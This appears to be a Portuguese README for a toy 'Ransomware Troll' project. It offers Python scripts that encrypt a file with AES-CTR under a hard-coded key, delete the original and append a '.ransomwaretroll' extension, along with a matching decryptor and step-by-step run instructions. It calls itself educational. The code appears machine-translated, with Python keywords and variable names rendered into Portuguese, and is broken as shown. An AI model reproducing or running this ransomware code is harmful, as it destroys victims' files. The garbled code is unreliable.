# Ransomware
Entendendo um Ransomware na Prática com Python

# Pré-requisitos
Antes de executar os códigos de descrição e criptografia, é necessário ter o Python instalado em seu sistema. Além disso, você deve ter uma biblioteca pyaesinstalada. Você pode conectá-lo usando o comandopip install pyaes .

# Código de Descripción
Aqui está o código base que pode ser usado para descrever arquivos criptografados pelo Ransomware Troll:

```pitão
importar sistema operacional
importar pyaes

#Nome do arquivo criptografado
file_name =  " arquivo.txt.ransomwaretroll "

# Abre o arquivo criptografado em modo de leitura binária
arquivo  =  aberto (nome_do_arquivo, " rb " )
file_data =  arquivo .read()
arquivo .close()

# Chave para descripção
chave =  b " testeransomwares "
aes = pyaes.AESModeOfOperationCTR(chave)

# Realizar a descritografia
decrypt_data = aes.decrypt(dados_do_arquivo)

# Removendo o arquivo criptografado
os.remove(nome_do_arquivo)

# Crie o arquivo descrito
new_file =  " arquivo.txt "
novo_arquivo =  aberto ( f ' { novo_arquivo } ' , " wb " )
novo_arquivo.escrever(descriptografar_dados)
novo_arquivo.fechar()
```


-Se de substituir "arquivo.txt.ransomwaretroll"pelo nome do arquivo criptografado real que você deseja descrever e"testeransomwares" pela chave correta de descritiva fornecida pelo atacante.

# Código de Criptografia
Aqui está o código base que pode ser usado para criptografar arquivos usando o Ransomware Troll:

``` pitão
importar sistema operacional
importar pyaes

# Nome do arquivo a ser criptografado
nome_do_arquivo =  " arquivo.txt "

# Abre o arquivo em modo de leitura binária
arquivo  =  aberto (nome_do_arquivo, " rb " )
file_data =  arquivo .read()
arquivo .close()

# Remover o arquivo original
os.remove(nome_do_arquivo)

# Chave para criptografia
chave =  b " testeransomwares "
aes = pyaes.AESModeOfOperationCTR(chave)

# Realizar a criptografia
crypto_data = aes.encrypt(dados_do_arquivo)

#Nome do novo arquivo criptografado
novo_arquivo = nome_do_arquivo +  " .ransomwaretroll "
novo_arquivo =  aberto ( f ' { novo_arquivo } ' , ' wb ' )
novo_arquivo.escrever(dados_criptográficos)
novo_arquivo.fechar()
```

-Se de substituir "arquivo.txt"pelo nome do arquivo que você deseja criptografar e"testeransomwares" pela chave correta de criptografia. O código criptografado será o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransom


## Instruções

Para descrever um arquivo afetado pelo Ransomware Troll, siga estas etapas:

1 . Verifique se você tem o Python instalado em seu sistema.

2 . Instale a biblioteca ` pyaes` usando o comando ` pip install pyaes` .

3 . Copie o código de descrição fornecido acima e cole-o em um novo arquivo Python.

4 . Abra o arquivo Python em um editor de texto e modifique a linha ` file_name = "arquivo.txt.ransomwaretroll" ` para corresponder ao nome do arquivo criptografado que você deseja descrever.

5 . Verifique se a chave correta de descritiva está definida na linha ` key = b"testeransomwares" ` . Se o fornecedor tiver fornecido uma chave diferente, atualize-a aqui.

6 . Salve o arquivo Python com um nome adequado, por exemplo, ` descriptografar.py ` .

7 . Abra o terminal ou prompt de comando e navegue até o diretório onde você salvou o arquivo Python.

8 . Execute o arquivo Python escrevendo o seguinte comando: ` python descriptografar.py ` .

9 . O código descreverá o arquivo e removerá o arquivo criptografado original.

10 . Verifique se o arquivo descrito foi criado corretamente.

Para criptografar um arquivo usando o Ransomware Troll, siga as mesmas etapas de 1 a 7 acima, mas substitua o código de descrição pelo código de criptografia fornecido. Certifique-se de fornecer o nome do arquivo que você deseja criptografar e a chave correta de criptografia. O arquivo criptografado será salvo com a extensão ` .ransomwaretroll ` .

** Nota: ** Vale destacar que esta solução foi fornecida exclusivamente para fins educacionais e de pesquisa. Não incentivamos o uso de ransomware ou qualquer atividade ilegal. A descriptografia de arquivos criptografados por ransomware só é possível com a chave adequada. Recomendamos que, em caso de ataque, você busque a ajuda de profissionais especializados em segurança cibernética.
